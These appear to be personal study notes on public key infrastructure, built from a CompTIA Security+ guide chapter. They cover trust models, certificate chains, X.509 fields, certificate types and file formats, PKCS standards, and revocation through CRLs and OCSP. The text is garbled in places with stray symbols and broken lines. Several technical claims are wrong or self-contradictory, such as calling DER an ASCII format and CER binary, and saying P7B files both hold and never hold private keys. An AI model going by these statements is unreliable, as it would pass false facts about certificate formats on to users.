are referred to as subordinate CAs as they are subordinate to the CA that they reference. The path of trust is walked up from the subordinate CA to the higher-level CA; in essence, the subordinate CA is using the higher- level CA as a reference.
- As shown in Figure 24-10, no bidirectional trusts exist—they are all unidirectional trusts, as indicated by the one-way arrows. Since no other entity can certify and generate certificates for the root CA, it creates a self-signed certificate. This means that the certificate’s issuer and subject fields hold the same information, both representing the root CA, and the root CA’s public key will be used to verify this certificate when that time comes. This root CA certificate and public key are distributed to all entities within this trust model.
Walking the Certificate Path
- When a user in one trust domain needs to communicate with another user in another trust domain, one user will need to validate the other’s certificate. This sounds simple enough, but what it really means is that each certificate for each CA, all the way up to a shared trusted anchor, also must be validated. If Debbie needs to validate Sam’s cer- tificate, as shown in Figure 24-10, she actually also needs to validate the Leaf D CA and Intermediate B CA certificates, as well as Sam’s.
- So in Figure 24-10, we have a user, Sam, who digitally signs a message and sends it and his certificate to Debbie. Debbie needs to validate this certificate before she can trust Sam’s digital signature. Included in Sam’s certificate is an issuer field, which indicates that the certificate was issued by Leaf D CA. Debbie has to obtain Leaf D CA’s digital certificate and public key to validate Sam’s certificate. Remember that Debbie validates the certificate by verifying its digital signature. The digital signature was created by the certificate issuer using its private key, so Debbie needs to verify the signature using the issuer’s public key.
- Debbie tracks down Leaf D CA’s certificate and public key, but she now needs to verify this CA’s certificate, so she looks at the issuer field, which indicates that Leaf D CA’s certificate was issued by Intermediate B CA. Debbie now needs to get Intermediate B CA’s certificate and public key.
- Debbie’s client software tracks this down and sees that the issuer for the Intermediate B CA is the root CA, for which she already has a certificate and public key. So Debbie’s client software had to follow the certificate path, meaning it had to continue to track down and collect certificates until it came upon a self-signed certificate. A self-signed certificate indicates that it was signed by a root CA, and Debbie’s software has been configured to trust this entity as her trust anchor, so she can stop there. Figure 24-11 illustrates the steps Debbie’s software had to carry out just to be able to verify Sam’s certificate.
- This type of simplistic trust model works well within an enterprise that easily follows a hierarchical organizational chart, but many companies cannot use this type of trust model because different departments or offices require their own trust anchors. These demands can be derived from direct business needs or from interorganizational
•
- Figure 24-11 Verifying each certificate in a certificate path
- politics. This hierarchical model might not be possible when two or more
companies need to communicate with each other. Neither company will let the other’s CA be the root CA, because each does not necessarily trust the other entity to that degree. In these situations, the CAs will need to work in a peer-to-peer relationship instead of in a hierarchical relationship.
Peer-to-Peer Model - In a peer-to-peer trust model, one CA is not subordinate to another CA, and no established trusted anchor between the CAs is involved. The end-entities will look to their issuing CA as their trusted anchor, but the different CAs will not have a common anchor.
- Figure 24-12 illustrates this type of trust model. The two different CAs will certify the public key for each other, which creates a bidirectional trust. This is referred to as cross certification, since the CAs are not receiving their certificates and public keys from a superior CA, but instead are creating them for each other.
- Figure 24-12
- Cross certifica- tion creates a peer-to-peer PKI model.
- Chapter 24: Cryptographic Methods
- 483
- PART VI
- CompTIA Security+ All-in-One Exam Guide
- 484 •
- Figure 24-13
- Scalability is a drawback in cross-certification models. •
- One of the main drawbacks to this model is scalability. Each CA must certify
every other CA that is participating, and a bidirectional trust path must be implemented, as shown in Figure 24-13. If one root CA were certifying all the intermediate CAs, scalability would not be as much of an issue. Figure 24-13 represents a fully connected mesh architecture, meaning that each CA is directly connected to and has a bidirectional trust relationship with every other CA. As you can see in this illustration, the complexity of this setup can become overwhelming.
Hybrid Trust Model
- A company can be complex within itself, and when the need arises to communicate properly with outside partners, suppliers, and customers in an authorized and secured manner, this complexity can make sticking to either the hierarchical or peer-to-peer trust model difficult, if not impossible. In many implementations, the different model types have to be combined to provide the necessary communication lines and levels of trust. In a hybrid trust model, the two companies have their own internal hierarchical models and are connected through a peer-to-peer model using cross certification. Figure 24-14 illustrates the role that a bridge CA could play—it is responsible for issuing cross certificates for all connected CAs and trust domains. The bridge CA is not considered a root or trust anchor, but merely the entity that generates and maintains the cross certification for the connected environments.
- EXAM TIP Three trust models exist: hierarchical, peer-to-peer, and hybrid. Hierarchical trust is like an upside-down tree. Peer-to-peer is a lateral series of references, and hybrid is a combination of hierarchical and peer- to-peer trust.
- Figure 24-14 A bridge CA can control the cross-certification procedures. •
Chapter Review
In this chapter, you became acquainted with the application of cryptographic algo- rithms. Hash values were the first type covered, followed by symmetric algorithms. Asymmetric algorithms followed, and then common cryptographic applications were presented. The chapter then presented public key infrastructure (PKI), the essential elements to manage public keys. Much of this chapter is a repeat from earlier material, but what is important to learn is which cryptographic algorithms are employed under which circumstances.
Digital certificates:
- Provides assurance that the people they are communicating with truly are who they claim to be.
- Essentially are endorsed copies of an individual’s public key.
  - digital certificate binds an individual’s identity to a public key, contains all info a receiver needs to be assured of the identity of the public key owner.  ▪


## - There is more information in the certificate, but not all visible in the figure.
Certificate chaining: refers to the fact that certificates are handled by a chain of trust.  The authentication requirements differ depending on the type of certificate being requested.
- usually at least 3 types.
  - higher class of certificate carry out more powerful and critical tasks
than the one below it.
- Class 1 certificate
  - usually for verify an individual’s identity through e-mail.
  - A person who receives a Class 1 certificate can use his public / private key pair to digitally sign e-mail and encrypt message contents.
  - may only be asked to provide your name, e-mail address, and physical address.
  - In most situations, will require the user to enter specific information into a web-based form.
  - The web page will have a section that accepts the user’s public key, or it will step the user through creating a public/private key pair, which will allow the user to choose the size of the keys to be created. ▪


## 1:1 ▪


## - - ▪


## ▪
Class 2 certificate:
  - can be used for software signing.
  - software vendor would register for this type of certificate to digitally sign its software.
  - provides integrity for the software after it is developed and released,
  - allows the receiver of the software to verify from whom the software actually came.
  - may need to provide the RA with more data, such as your driver’s license, passport, and company information that can be verified.
Class 3 certificate:
  - can be used by a company to set up its own CA,
  - allow it to carry out its own identification verification and generate certificates internally.
  - will be asked to provide even more information and most likely will need to go to the RA’s office for a face-to-face meeting.
correspondence does not necessarily exist between identities and certificates. An entity can have multiple key pairs for separate purposes.
Thus, an entity can have multiple certificates, each attesting to separate public key ownership.
It is also possible to have different classes of certificates, again with different keys.
This flexibility allows entities total discretion in how they manage their keys, and the PKI manages the complexity by using a unified process that allows key verification through a common interface.
If an application creates a key store that can be accessed by other app, it will provide a standardized interface, application programming interface (API).
- In Mozilla and Linux systems, this interface is usually PKCS #11,
- in Microsoft applications the interface is Cryptography API: Next
Generation (CNG) for Microsoft Vista and later.
- example, Figure 24-4 shows that
- Application A went through the process of registering a certificate and
generating a key pair.
- It created a key store that provides an interface to allow other applications to communicate with it and use the items held within the store.
The local key store is just one location where these items can be held.
- Often the digital certificate and public key are also stored in a certificate
repository so that they are available to a subset of individuals.
Certificate:
- a mechanism that associates the public key with an individual,
- contains a great deal of information about the user.
- Each user of a PKI system has a certificate used to verify their authenticity.
X.509 standard:
After an RA verifies an individual’s identity, the CA generates the digital certificate,
but how does the CA know what type of data to insert into the certificate?
- The certificates are created and formatted based on the X.509 standard
  - outlines the necessary fields of a certificate and the possible values that
can be inserted into the fields.
- X.509 version 3 is the most current version of the standard.
  - a standard of the International Telecommunication Union (www.itu.int).
  - The IETF’s Public-Key Infrastructure (X.509), or PKIX, working group
has adapted the X.509 standard to the more flexible organization of the Internet, as specified in RFC 3280, and is commonly referred to as PKIX for Public Key Infrastructure (X.509).
- Digital certificates contain specific identifying information, and their construction is governed international standard X.509.
- defines the certificate formats and fields for public keys.
- defines the procedures should used to distribute public keys.
- comes in two basic types:   - End-Entity Certificate: The most common
  - issued by a CA to an end entity.
  - An end entity is a system that doesn’t issue certificates but merely uses them.
  - CA Certificate
  - issued by one CA (root certificate) to another CA (intermedia CA).
  - The second CA, in turn, can then issue certificates to an end entity.
Certificates that conform to X.509 contain the following data:
- V ersion:
  - the version of the X.509 standard that was followed to create the certificate;
  - indicates the format and fields that can be used.
- Serial number: uniquely identifies the certificate, from the CA
  - The CA uses this serial number to validate a certificate.
  - If the CA revokes the certificate, it publishes this serial number in a
certificate revocation list (CRL).
- Signature algorithm identifier
  - the technique used by the CA to digitally sign the contents of the certificate.
- Validity period: the dates and times
  - valid starting and ending date and time
- Issuer: identification of the CA that issued the certificate
- Issuer unique identifier (versions 2 and 3 only). - Subject unique identifier (versions 2 and 3 only).
- Subject’s name:
  - contains the distinguished name, or DN, of the entity that owns the public key contained in the certificate.
  - example:
  - subject as Google, Inc, a wildcard certificate, used for all web sites
with the google.com root domain name.
- Subject’s public key:
  - the meat of the certificate
  - Identifies the public key being bound to the certified subject;
  - the actual public key the certificate owner used to set up secure communications
  - identifies the algorithm used to create the private/public key pair.
  - RSA asymmetric encryption uses the public key in combination with
the matching private key.
- Extensions (version 3 only).
  - customized variables containing data inserted into the certificate by
the certificate authority
  - to support tracking of certificates or various applications.
- Object identifiers/OIDs: used in X.509 certificate extensions (optional, help identify objects. usually dot separated numbers. Example, OID 2.5.4.6 might correspond to the country-name value)
- Certificate usage:
  - Specifies the approved use of the certificate, dictates intended use of this
public key.
  - Some certificates only for encryption or authentication   - some certificates support multiple usages. - Extensions:
  - Allows additional data to be encoded into the certificate to expand the functionality of the certificate.
  - Companies can customize the use of certificates within their environments by using these extensions.
  - X.509 v3 has extended the extension possibilities.
X.509: not officially accepted as a standard, and implementations can vary from
vendor to vendor.
- Microsoft and Mozilla have adopted X.509 as their defacto standard for Secure Sockets Layer (SSL) communication between web clients and servers.
Purchase the complete official X.509 standard from the International Telecommunications Union (ITU). It’s part of the Open Systems Interconnection (OSI) series of communication standards and can be purchased electronically on the ITU website at www.itu.int.
Example:  actual values of these different certificate fields for a particular certificate in Internet Explorer.
- The version: V3 (X.509 v3) and the serial number is also listed—this number is unique for each certificate that is created by a specific CA.
- The CA used the MD5 hashing algorithm to create the message digest value, and it then signed with its private key using the RSA algorithm.
- The actual CA that issued the certificate is Root SGC Authority
- the valid dates indicate how long this certificate is valid.
- The subject is MS SGC Authority, which is the entity that registered this
certificate and is the entity that is bound to the embedded public key.
- The actual public key is shown in the lower window and is represented in
hexadecimal.
- The subject of a certificate is commonly a person, can be a network device
(router, web server, firewall, and so on), an application, a department, a company, or a person.
  - Each has its own identity that needs to be verified and proven to another
entity before secure, trusted communication can be initiated.
  - If a network device is using a certificate for authentication, the certificate
may contain the network address of that device. This means that if the certificate has a network address of 10.0.0.1, the receiver will compare this to the address from which it received the certificate to make sure a man-in-the-middle attack is not being attempted.
Certificate Attributes
- Four main types of certificates are used:
  - End-entity certificates
  - CA certificates
  - Cross-certification certificates
  - Policy certificates  - End-entity certificates:
  - issued by a CA to a specific subject, Joyce, the Accounting
department, or a firewall.
  - An end-entity certificate is the identity document provided by PKI
implementations.
- CA certificate:
  - can be self-signed, in the case of a stand-alone or root CA,
  - or it can be issued by a superior CA within a hierarchical model.
  - the superior CA gives the authority and allows the subordinate CA to accept certificate requests and generate the individual certificates itself.
  - may be necessary when a company needs to have multiple internal CAs,
  - different departments within an organization need to have their own CAs servicing their specific end-entities (users, network devices, and applications) in their sections.
  - In these situations, a representative from each department requiring a CA registers with the more highly trusted CA and requests a CA certificate.
- Cross-certification certificates / cross-certificates:
  - used when independent CAs establish peer-to-peer trust relationships.
  - a mechanism, one CA can issue a certificate allowing its users to trust
another CA.
- Policy certificates:
  - Within sophisticated CAs used for high-security applications, a mechanism is required to provide centrally controlled policy information to PKI clients.
  - This is often done by placing the policy information in a policy certificate.
Types of Certificates
Types of X.509 certificates: slightly different purpose, same general structure, but the application is different.
- Wildcard certificates: more widely, with subdomains of a given domain.
  - starts with an asterisk (*)
  - wildcard certificate for all subdomains. No different X.509 certificate for each subdomain
  - can be used for multiple domains, but each domain name must have the same root domain.
  - Wildcard certificates can reduce the administrative burden associated with managing multiple certificates.
⁃
  - Example
  - Google
  - wildcard certificate issued to *.google.com.
 To use a single certificate for a subdomain and “entirely different
  domain”, a SAN must be used.
    - same certificate can be used for Google domains :close alternative that supports any sub domain (e.g. *.google.com)
  - accounts.google.com and support.google.com.
  - But could not be used for gmail.com.
- Subject Alternative Name (SAN) certificates:
  - not so much a type of certificate as a special field in X.509.
  - used for multiple domains that have different names, but are owned by
the same organization.
  - Example:
  - Google uses SANs of *.google.com, *.android.com,
*.cloud.google.com, and more.
  - It is most commonly used for systems with the same base domain names, but different top-level domains.
  - Example
  - if Google used names such as google.com and google.net, it could use
a single SAN certificate for both domain names.
  - specify additional items (IP addresses, domain names...) to be protected by this single certificate.
⁃
  - Provides extended site validation. ⁃
   with a list of alternative domains, sub domains, IP
addresses that can also use the certificate.
  Example:
  - CrucialExams.com,    - www.CrucialExams.com,
  - api.CrucialExams.com,
  - IP 4.5.4.5 (all in a single cert).
- X-509-compliant certificate:
  - Example: hardening a web server, which should allow a secure certificate-based session using the organization's PKI infrastructure. The web server should also utilize the latest security techniques and standards.
- self-signed certificate:
  - not issued by a trusted CA.
  - Private CAs within an enterprise often create self-signed certificates.
  - They aren’t trusted by default. However, administrators can use automated means to place copies of the self-signed certificate into the trusted root CA store for enterprise computers.
  - Self-signed certificates from private CAs eliminate the cost of purchasing certificates from public CAs.
  - using Microsoft Internet Information Services (IIS).
  - The certificate will be X.509, digitally signed by you, can be used to
transmit your public key
  - but it won’t be trusted by browsers, will instead generate a certificate error message.
- Code signing certificates: certificates digitally sign computer code.
  - validate the authentication of executable applications or scripts.
  - verifies the code has not been modified.
  - Ensuring no altered since the developer created it.
    - digitally sign a program's executable or script files.
  - This allows the person/computer running the application or script to verify it's authenticity
- Machine/computer certificates: certificates assigned to a specific machine. often used in authentication schemes.
  - The certificate is typically used to identify the computer within a domain.
  - Example: for machine to sign in to the network, it must authenticate using
its machine certificate.
- Email certificates: two uses of email certificates are for encryption of emails
and digital signatures.
  - Secure Multipurpose Internet Mail Extensions (S/MIME) uses X.509 certificates to secure email communications.
- User certificates: for individual users, often used for authentication. Users must present their certificate to authenticate prior to accessing some resource.
  - Example
  - Microsoft systems can create user certificates allowing the user to
encrypt data using Encrypting File System (EFS).
- Root certificates: for root authorities, usually self-signed by that authority.
- Domain validation certificates: (most common certificates)
  - to secure communication with a specific domain.
  - a low-cost certificate that website administrators use to provide TLS for a
given domain.
  - indicates that the certificate requestor has some control over a DNS domain.
  - The CA takes extra steps to contact the requestor such as by email or telephone.   - The intent is to provide additional evidence to clients that the certificate and the organization are trustworthy.
- Extended validation certificates:
  - require more validation of the certificate holder, provide more security.
  - use additional steps beyond domain validation.
  - If you visit a domainwith an extended validation certificate, the address bar includes the name of the company before the actual URL.
  - This helps prevent impersonation from phishing attacks.
  - Example
  - PayPal
  - uses an extended validation certificate.
  - it shows PayPal, Inc [US] | before the URL.
  - Imagine an attacker sends a phishing email with a link to paypa1.com (with 1 in paypa1 instead of the letter).
  - If a user clicks the link, she will be able to see that the site isn’t truly a PayPal site, assuming she understands extended validation certificates.
Certificate Formats Most certificates use one of the X.509 v3 formats.
certificates used to distribute certificate revocation lists use the X.509 v2 format.
Certificates are typically stored as:
- binary files: stored as 1s and 0s.
- BASE64 American Standard Code for Information Interchange (ASCII) encoded files: converts the binary data into an ASCII string format.
- Additionally, some certificates are also encrypted to provide additional confidentiality.
- The base format of certificates is (CER) or (DER).
  - CER and DER formats are defined by the International Telegraph Union Telecommunication Standardization Sector (ITU-T) in the X.690 standard.
  - They use a variant of the Abstract Syntax Notation One (ASN.1) format,whichdefinesdatastructurescommonlyused in cryptography.
  - CER is a binary format and DER is an ASCII format.
DER-based certificates include headers and footers to identify the contents.
- Example
- a header and a footer for a certificate:
-----BEGIN CERTIFICATE-----
MIIDdTCCAl2gAwIBAgILBAAAAAABFUtaw5QwDQYJKoZIhvcNAQEFB ... additional ASCII Characters here... HMUfpIBvFSDJ3gyICh3WZlXi/EjJKSZp4A==
-----END CERTIFICATE-----
- Each header starts with five dashes (-----), BEGIN, a label, and five more dashes.
- The footer starts with five dashes, End, the same label, and five more dashes.
- the label: CERTIFICATE, PUBLIC KEY, PRIVATE KEY, ENCRYPTED PRIVATE KEY, CERTIFICATE REQUEST, and X509 CRL.
- CER-based certificates are binary encoded so they do not have headers and footers.
Certificate files can have many extensions
 - .cer: Canonical Encoding Rules
  - binary format
  - alternate form of .crt (Microsoft Convention).
  - can use Microsoft crypto API to convert .crt to .cer (both DER-
encoded .cer, or base64 [PEM]-encoded .cer).   - also recognized by IE as a command to run an MS cryptoAPI command (specifically rundll32.exe cryptext.dll, CryptExtOpenCER).
- .der: Distinguished Encoding Rules
  - ASCII format.
  - used for binary DER-encoded certificates. These files may also bear the .cer or .crt.
- .pem:
  - derived from the Privacy Enhanced Mail format
  - PEM-based certificates can be used for just about anything.
  - can be formatted as CER (binary files) or DER (ASCII files).
  - can also be used to share public keys within a certificate, request certificates from a CA as a CSR, install a private key on a server, publish a CRL, or share the full certificate chain.
  - PEM-encoded certificate with the. pem extension.
  - more common for the certificate to use other extensions.
  - Example
  - PEM-encoded file holding the certificate with the public key typically uses the.cer or.crt extension.
  - A PEM file holding just the private key typically uses the. key extension.
- .pfx: Personal Information Exchange
  - (PKCS 12 archive) archive file for PKCS#12 standard certificate
    - used for different types of X.509v3 files that contain ASCII (Base64) armored data prefixed with a -- BEGIN ... line.
  - most common format in certificates
  information.
  - a predecessor to the P12 certificate and it has the same usage.
  - Administrators often use this format on Windows systems to import
and export certificates.
- P12: the use of PKCS#12 standard.
  - commonly used to store private keys
  - use the PKCS version 12 (PKCS#12) format and they are CER-based (binary).
  - They are commonly used to hold certificates with the private key.
  - Example
  - installing a certificate on a server to supports HTTPS sessions, you might install a P12 certificate with the private key.
  - Because it holds the private key, it’s common to encrypt P12 certificates. It’s also possible to include the full certificate chain in a P12 certificate.
- P7b: base 64 encoded ASCII files. They actually include several variations: P7b, P7C, etc.
  - use the PKCS version 7 (PKCS#7) format and they are DER-based (ASCII).
  - commonly use: share public keys with proof of identity of the certificate holder.
  - Recipients use the public keys to encrypt or decrypt data.
   - commonly used to store private keys. includes the private key, should never be shared!
 Public Public
Key Infrastructure X.509 Key Cryptography Standards
  -   -   - ⁃
Example
web server might use a P7B certificate to share its public key. P7B certificates can also contain a certificate chain or a CRL. However, they never include the private key.
Public Key Infrastructure X.509 (PKIX):
- working group formed by the IETF
- develop standards and models for the PKI environment.
- The PKIX working group is responsible for the X.509 standard.
Public Key Cryptography Standards (PKCS) - a set of voluntary standards created by RSA and security leaders.
- Early members: Apple, Microsoft, DEC (now HP), Lotus, Sun, and MIT.
- Currently, there are 15 published PKCS standards:
  - PKCS #1: RSA Cryptography Standard
PKCS #2: Incorporated in PKCS #1
PKCS #3: Diffie-Hellman Key Agreement Standard
PKCS #4: Incorporated in PKCS #1
PKCS #5: Password-Based Cryptography Standard
PKCS #6: Extended-Certificate Syntax Standard
PKCS #7: Cryptographic Message Syntax Standard
PKCS #8: Private-Key Information Syntax Standard
PKCS #9: Selected Attribute Types
PKCS #10: Certification Request Syntax Standard
PKCS #11: Cryptographic Token Interface Standard
PKCS #12: Personal Information Exchange Syntax Standard PKCS #13: Elliptic Curve Cryptography Standard
PKCS #14: Pseudorandom Number Generators
PKCS #15: Cryptographic Token Information Format Standard
These standards are coordinated through RSA; however, experts worldwide are welcome to participate in the development process.
Certificate Lifecycles
- Keys and certificates should have lifetime settings that force the user to register for a new certificate after a certain amount of time.
- Certificate lifetimes means that the certificate and key pair has a lifecycle that must be managed.
- proper length of lifetimes is a trade-off:
  - shorter lifetimes limit the ability of attackers to crack them,
  - longer lifetimes lower system overhead.
- More sophisticated PKI implementations perform automated and often transparent key updates to avoid the time and expense of having users register for new certificates when old ones expire.
- Certificate management: registration, certificate, key generation, renewal, and revocation. Registration and Generation
A key pair (public and private keys) can be generated:
- locally by an app and stored in a local key store on the user’s workstation.
- created by a central key-generation server, secure transmission of the keys to
the user.
  - can be stored on the user’s workstation or on the user’s smart card, more
flexibility and mobility.
In most modern PKI implementations, users have two key pairs.
- One key pair:
  - often generated by a central server
  - used for encryption and key transfers.
  - This allows the corporate PKI to retain a copy of the encryption key pair
for recovery, if necessary.
- The second key pair
  - a digital signature key pair
  - usually generated by the user (the only one with a copy of the private
key).
  - Nonrepudiation can be challenged if there is any doubt about someone
else obtaining a copy of an individual’s signature private key.
  - If created on a centralized server, weaken the case, the individual
was the only one who had a copy of her private key.
  - If stored anywhere other than in her possession, there is a possibility of someone obtaining the user’s key, then true
nonrepudiation cannot be provided.
proof of possession:
- The act of verifying that an individual indeed has the private key for a given public key.
- Not all public/private key pairs can be used for digital signatures, so asking the individual to sign a message and return it to prove that she has the necessary private key will not always work.
- If a key pair is used for encryption, the RA can send a challenge value to the individual, who, in turn, can use her private key to encrypt that value and return it to the RA. If the RA can successfully decrypt this value with the public key that was provided earlier, the RA can be confident that the individual has the necessary private key and can continue through the rest of the registration phase.
The PKI administrator usually configures the minimum required key size that users must use to have a key generated for the first time, and then for each renewal. In most applications, a drop-down list shows possible algorithms from which to choose, and possible key sizes. The key size should provide the necessary level of security for the current environment. The lifetime of the key should be long enough that continual
renewal will not negatively affect productivity, but short enough to ensure that the key cannot be successfully compromised.
certificate signing request (CSR)
- is the actual request to a CA containing a public key and the requisite information needed to generate a certificate.
- The CSR contains all of the identifying information that is to be bound to the key by the certificate generation process.
Renewal
- The certificate itself has its own lifetime, which can be different than the key pair’s lifetime.
- The certificate’s lifetime is specified by the validity dates inserted into the digital certificate. These are beginning and ending dates indicating the time period during which the certificate is valid.
- The certificate cannot be used before the start date, and once the end date is met, the certificate is expired and a new certificate will need to be issued.
- A renewal process is different from the registration phase
◦ the RA assumes that the individual has already successfully completed one registration round.
◦ If the certificate has not actually been revoked, the original keys and certificate can be used to provide the necessary authentication information and proof of identity for the renewal phase.
- The certificate may or may not need to change during the renewal process; this usually depends on why the renewal is taking place. If the certificate just expired and the keys will still be used for the same purpose, a new certificate can be generated with new validity dates. If, however, the key pair functionality needs to be expanded or restricted, new attributes and extensions may need to be integrated into the new certificate. These new functionalities may require more information to be gathered from the individual renewing the certificate, especially if the class changes or the new key uses allow for more powerful abilities.
- This renewal process is required when the certificate has fulfilled its lifetime and its end validity date has been met. This situation differs from that of a certificate revocation.
Revocation
- A certificate can be revoked when its validity needs to be ended before its actual expira- tion date is met, and this can occur for many reasons: example, a user may have lost a laptop or a smart card that stored a private key; an improper software implementation may have been uncovered that directly affected the security of a private key; a user may have fallen victim to a social engineering attack and inadvertently given up a private key; data held within the certificate may no longer apply to the specified individual; or perhaps an employee left a company and should not be identified as a member of an in-house PKI any longer. In the last instance, the certificate, which was bound to the user’s key pair, identified the user as an employee of the company, and the administra- tor would want to ensure that the key pair could not be used in the future to validate this person’s affiliation with the company. Revoking the certificate does this.
•
- If any of the previously listed things happens, a user’s private key has been compromised or should no longer be mapped to the owner’s identity. A different individual may have access to that user’s private key and could use it to impersonate and authenticate as the original user. If the impersonator used the key to digitally sign a message, the receiver would verify the authenticity of the sender by verifying the signature by using the original user’s public key, and the verification would go through perfectly—the receiver would believe it came from the proper sender and not the impersonator. If receivers could look at a list of certificates that had been revoked before verifying the digital signature, however, they would know not to trust the digital signatures on the list. Because of issues associated with the private key being compromised, revocation is permanent and final—once revoked, a certificate cannot be reinstated. If this were allowed and a user revoked his certificate, the unauthorized holder of the private key could use it to restore the certificate validity.
- example, if Joe stole Mike’s laptop, which held, among other things, Mike’s private key, Joe might be able to use it to impersonate Mike. Suppose Joe writes a message, digitally signs it with Mike’s private key, and sends it to Stacy. Stacy communicates with Mike periodically and has his public key, so she uses it to verify the digital signature. It computes properly, so Stacy is assured that this message came from Mike, but in truth it did not. If, before validating any certificate or digital signature, Stacy could check a list of revoked certificates, she might not fall victim to Joe’s false message.
- The CA provides this type of protection by maintaining a Certificate Revocation List (CRL), a list of serial numbers of certificates that have been revoked. The CRL also contains a statement indicating why the individual certificates were revoked and a date when the revocation took place. The list usually contains all certificates that have been revoked within the lifetime of the CA. Certificates that have expired are not the same as those that have been revoked. If a certificate has expired, it means that its end validity date was reached.
- The CA is the entity that is responsible for the status of the certificates it generates; it needs to be told of a revocation, and it must provide this information to others. The CA is responsible for maintaining the CRL and posting it in a publicly available directory.
- EXAM TIP The Certificate Revocation List is an essential item to ensure
a certificate is still valid. CAs post CRLs in publicly available directories to permit automated checking of certificates against the list before certificate use by a client. A user should never trust a certificate that has not been checked
- against the appropriate CRL.
- What if Stacy wants to get back at Joe for trying to trick her earlier, and she attempts to revoke Joe’s certificate herself? If she is successful, Joe’s participation in the PKI can be negatively affected because others will not trust his public key. Although we might think Joe may deserve this, we need to have some system in place to make sure people cannot arbitrarily have others’ certificates revoked, whether for revenge or for malicious purposes.
- When a revocation request is submitted, the individual submitting the request must be authenticated. Otherwise, this could permit a type of denial-of-service attack, in which someone has another person’s certificate revoked. The authentication can involve an agreed-upon password that was created during the registration process, but authentication should not be based on the individual proving that he has the corresponding private key, because it may have been stolen, and the CA would be authenticating an imposter.
- The CRL’s integrity needs to be protected to ensure that attackers cannot modify data pertaining to a revoked certification from the list. If this were allowed to take place, anyone who stole a private key could just delete that key from the CRL and continue to use the private key fraudulently. The integrity of the list also needs to be protected to ensure that bogus data is not added to it. Otherwise, anyone could add another person’s certificate to the list and effectively revoke that person’s certificate. The only entity that should be able to modify any information on the CRL is the CA.
- The mechanism used to protect the integrity of a CRL is a digital signature. The CA’s revocation service creates a digital signature for the CRL. To validate a certificate, the user accesses the directory where the CRL is posted, downloads the list, and verifies the CA’s digital signature to ensure that the proper authority signed the list and to ensure that the list was not modified in an unauthorized manner. The user then looks through the list to determine whether the serial number of the certificate that he is trying to validate is listed. If the serial number is on the list, the private key should no longer be trusted, and the public key should no longer be used. This can be a cumbersome process, so it has been automated in several ways that are described in the next section.
- One concern is how up-to-date the CRL is—how often is it updated and does it actually reflect all the certificates currently revoked? The actual frequency with which the list is updated depends upon the CA and its certification practices statement (CPS). It is important that the list is updated in a timely manner so that anyone using the list has the most current information. CRL files can be requested by individuals who need to verify and validate a newly received certificate, or the files can be periodically pushed down (sent) to all users participating within a specific PKI. This means the CRL can be pulled (downloaded) by individual users when needed or pushed down to all users within the PKI on a timed interval.
- The actual CRL file can grow substantially, and transmitting this file and requiring PKI client software on each workstation to save and maintain it can use a lot of resources, so the smaller the CRL is, the better. It is also possible to first push down the full CRL, and after that initial load, the following CRLs pushed down to the users are delta CRLs, meaning that they contain only the changes to the original or base CRL. This can greatly reduce the amount of bandwidth consumed when updating CRLs.
- In implementations where the CRLs are not pushed down to individual systems, the users’ PKI software needs to know where to look for the posted CRL that relates to the certificate it is trying to validate. The certificate might have an extension that points the validating user to the necessary CRL distribution point. The network administrator sets up the distribution points, and one or more points can exist for a particular PKI. The distribution point holds one or more lists containing the serial numbers of revoked certificates, and the user’s PKI software scans the list(s) for the serial number of the certificate the user is attempting to validate. If the serial number is not present, the user is assured that it has not been revoked. This approach helps point users to the right resource and also reduces the amount of information that needs to be scanned when checking that a certificate has not been revoked.
- One last option for checking distributed CRLs is an online service. When a client user needs to validate a certificate and ensure that it has not been revoked, he can communicate with an online service that will query the necessary CRLs available within the environment. This service can query the lists for the client instead of pushing down the full CRL to each and every system. So if Joe receives a certificate from Stacy, he can contact an online service and send it the serial number listed in the certificate Stacy sent. The online service would query the necessary CRLs and respond to Joe by indicating whether or not that serial number was listed as being revoked.
- One of the protocols used for online revocation services is the previously mentioned Online Certificate Status Protocol (OCSP), a request and response protocol that obtains the serial number of the certificate that is being validated and reviews CRLs for the client. The protocol has a responder service that reports the status of the certificate back to the client, indicating whether it has been revoked, it is valid, or its status is unknown. This protocol and service saves the client from having to find, download, and process the right lists.
- EXAM TIP Certificate revocation checks are done either by examining the CRL or using OCSP to see if a certificate has been revoked.
Certificate Authorities
- the glue that binds the public key infrastructure together
- responsible for issuing, revoking, and distributing certificates.
- offer notarization services for digital certificates.
- To obtain a digital certificate from a reputable CA, you must prove your identify to the satisfaction of the CA.
- can be online (common) / offline.
  - Online CA: most. always connected and accessible.
  - Offline CA: usually for a root CA that has been isolated from network access.
  - since isolated, compromised are reduced.
- can be either private or public,
- Public CAs: very large. providing certificates to the general public.
  - Public CAs make money by selling certificates.
  - the public CA must be trusted. - Private CAs: Many operating system providers allow their systems to be configured as CA systems
  - to generate internal certificates used within business/large external settings.
  - single service running on a server within a private network
Every CA should have a certification practices statement (CPS):
- outlines how identities are verified;
  - the steps the CA follows to generate, maintain, and transmit certificates;
- why the CA can be trusted to fulfill its responsibilities.
- It describes how keys are secured, what data is placed within a digital
certificate, and how revocations will be handled.
- If a company is going to use and depend on a public CA, the company’s
security officers, administrators, and legal department should review the CA’s entire CPS to ensure that it will properly meet the company’s needs, and to make sure that the level of security claimed by the CA is high enough for their use and environment.
- A critical aspect of a PKI is the trust between the users and the CA, so the CPS should be reviewed and understood to ensure that this level of trust is warranted.
The certificate server: the actual service that issues certificates based on the data provided during the initial registration process.
- The server constructs and populates the digital certificate with the necessary information and combines the user’s public key with the resulting certificate.
- The certificate is then digitally signed with the CA’s private key.
  - The use of the private key assures the recipient that the certificate
came from the CA.
The major CAs:
- Symantec
- Thawte - GeoTrust
- GlobalSign
- Comodo Limited
- Starfield Technologies
- GoDaddy
- DigiCert
- Network Solutions, LLC
- Entrust
Nothing is preventing any organization from simply setting up shop as a CA. However, the certificates issued by a CA are only as good as the trust placed in the CA that issued them. This is an important item to consider when receiving a digital certificate from a third party.
- If you don’t recognize and trust the name of the CA that issued the certificate, you shouldn’t place any trust in the certificate at all.
- PKI relies on a hierarchy of trust relationships: If you configure your browser to trust a CA, it will automatically trust all of the digital certificates issued by that CA.
- Browser developers preconfigure browsers to trust the major CAs to avoid placing this burden on users.
Registration authorities (RAs):
- assist Certificate authorities (CAs), verify users’ identities prior to issuing digital certificates.
  - providing certificates to users, requires server, CAs can become overloaded and need assistance.
- RA help offload work from the CA. operates as an intermediary in the process:
  - distribute keys,
  - accept registrations for a digital certificate for the CA,
  - register, authenticate and validate identities, allowing CAs to remotely validate user identities
  - require proof of identity from the individual requesting a certificate
  - validate this information.
  - then advise the CA to generate a certificate
